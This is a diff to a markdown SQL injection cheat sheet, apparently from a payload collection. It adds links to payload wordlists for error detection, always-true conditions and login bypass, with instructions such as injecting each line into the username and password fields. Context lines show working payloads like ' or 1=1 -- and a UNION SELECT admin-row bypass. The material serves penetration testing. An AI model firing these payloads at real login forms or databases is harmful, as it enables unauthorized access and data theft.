@@ -36,6 +36,7 @@ Simple characters
 )
 Wildcard (*)
 ```
+**Recommended:** [SQLi Error Detector](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_error_detector.txt)
 
 Multiple encoding
 
@@ -63,6 +64,9 @@ page.asp?id=1' or 1=1 -- true
 page.asp?id=1" or 1=1 -- true
 page.asp?id=1 and 1=2 -- false
 ```
+If you want to test possible combinations that, if vulnerable, the web should return the results of *id=1* it is **recommended:** [SQLi id 1](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_id_1.txt)
+
+If you want to test combinatios that always return *true* it is **recommended:** [SQLi True](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_or_true.txt)
 
 Weird characters
 
@@ -315,6 +319,9 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
+**Recommended** list for login bypass: [Authbypass](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_authbypass.txt)
+Try to inject each line of the list in the username and password at the same time.
+
 ## Authentication Bypass (Raw MD5)
 
 When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
@@ -342,6 +349,8 @@ SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```sql
 admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
 ```
+**Recomended**: [Passwd1234](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_passwd_1234.txt)
+Use as username each line of the file and as password *1234*.
 
 ## Insert Statement - ON DUPLICATE KEY UPDATE
 
